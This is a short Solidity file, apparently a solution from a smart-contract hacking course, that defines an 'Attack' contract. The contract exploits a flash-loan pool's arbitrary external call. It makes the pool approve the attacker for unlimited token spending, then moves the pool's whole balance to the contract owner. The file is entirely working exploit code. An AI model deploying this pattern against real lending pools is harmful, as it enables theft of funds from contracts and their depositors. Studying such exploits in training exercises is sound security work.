// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol"

interface IPool {
    function requestFlashLoan(uint256 amount, address borrower, address target,bytes calldata data) external;
}

contract Attack{
IPool immutable pool;
IERC20 immutable token;
address immutable owner;
constructor(address _pool, address _token){
    pool = IPool(_pool);
    token = IERC20(_token);
    owner = msg.sender;
}

function attack() external{
require(msg.sender == owner, "Not an owner");

bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), 2 ** 256 -1);
pool.requestFlashLoan(0, address(this), address(token), data);

uint256 balance = token.balanceOf(address(pool));
token.transferFrom(address(pool), owner, balance);
}
}